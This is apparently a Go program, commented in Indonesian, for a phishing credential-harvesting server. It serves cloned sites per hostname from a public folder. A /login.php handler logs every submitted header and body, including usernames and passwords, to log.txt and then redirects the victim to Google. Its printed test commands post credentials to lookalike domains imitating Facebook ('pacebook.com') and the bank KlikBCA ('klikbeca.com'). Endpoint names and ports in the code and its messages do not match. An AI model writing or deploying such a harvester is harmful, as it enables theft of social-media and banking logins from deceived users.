package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// logHandler adalah fungsi universal untuk mencatat semua detail permintaan (request) yang masuk.
func logHandler(w http.ResponseWriter, r *http.Request) {
	// 1. Siapkan slice untuk menampung isi body (payload) dari request.
	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("Gagal membaca request body: %v", err)
		http.Error(w, "Tidak dapat membaca body", http.StatusInternalServerError)
		return
	}
	// 2. Jangan lupa untuk menutup body setelah dibaca.
	defer r.Body.Close()

	// 3. Buat string yang akan berisi semua informasi request yang akan dicatat.
	logEntry := fmt.Sprintf(`
--- [%s] New Request ---
Timestamp: %s
Method: %s
URL: %s
Remote Address: %s
Headers:
%s
Body:
%s
--------------------------
`,
		r.Host,
		time.Now().Format(time.RFC3339),
		r.Method,
		r.URL.String(),
		r.RemoteAddr,
		formatHeaders(r.Header),
		formatBody(r.Header.Get("Content-Type"), body),
	)

	// 4. Buka atau buat file log.txt untuk menulis entri log.
	file, err := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		log.Printf("Gagal membuka file log: %v", err)
		http.Error(w, "Kesalahan server internal", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	// 5. Tulis entri log ke dalam file.
	if _, err := file.WriteString(logEntry); err != nil {
		log.Printf("Gagal menulis ke file log: %v", err)
		http.Error(w, "Kesalahan server internal", http.StatusInternalServerError)
		return
	}

	// 6. Redirect klien ke Google.com setelah selesai mencatat.
	// http.StatusFound (302) adalah kode untuk "temporary redirect".
	log.Printf("Request dari %s ke %s telah dicatat. Mengalihkan ke Google.com...", r.RemoteAddr, r.URL.Path)
	http.Redirect(w, r, "https://google.com", http.StatusFound)
}

// formatHeaders adalah fungsi helper untuk mengubah header menjadi string yang mudah dibaca.
func formatHeaders(h http.Header) string {
	var builder strings.Builder
	for key, values := range h {
		builder.WriteString(fmt.Sprintf("  %s: %s\n", key, strings.Join(values, ", ")))
	}
	return builder.String()
}

// formatBody adalah fungsi helper untuk memformat body berdasarkan Content-Type.
func formatBody(contentType string, body []byte) string {
	if len(body) == 0 {
		return "(Empty Body)"
	}

	if strings.Contains(contentType, "application/json") {
		var prettyJSON bytes.Buffer
		if err := json.Indent(&prettyJSON, body, "", "  "); err == nil {
			return prettyJSON.String()
		}
	}

	return string(body)
}

// virtualHostHandler adalah fungsi handler yang akan menangani permintaan file statis.
func virtualHostHandler(w http.ResponseWriter, r *http.Request) {
	host := strings.Split(r.Host, ":")[0]
	host = strings.TrimPrefix(host, "www.")
	direktori := filepath.Join("public", host)
	fileServer := http.FileServer(http.Dir(direktori))
	fileServer.ServeHTTP(w, r)
}

func main() {
	// Daftarkan logHandler untuk menangani request ke /log.php.
	http.HandleFunc("/login.php", logHandler)

	// Daftarkan virtualHostHandler untuk semua route lainnya.
	http.HandleFunc("/", virtualHostHandler)

	port := ":80"
	fmt.Printf("Server berjalan di http://localhost%s\n", port)
	fmt.Println("Endpoint logging aktif di /log.php dan akan me-redirect ke Google.com.")
	fmt.Println("Contoh pengujian:")
	fmt.Println(`  curl -v -X POST -d "user=a&pass=b" http://pacebook.com:8080/log.php`)
	fmt.Println(`  curl -v -X POST -H "Content-Type: application/json" -d '{"user":"x","pass":"y"}' http://klikbeca.com:8080/log.php`)

	err := http.ListenAndServe(port, nil)
	if err != nil {
		log.Fatal("Gagal menjalankan server: ", err)
	}
}
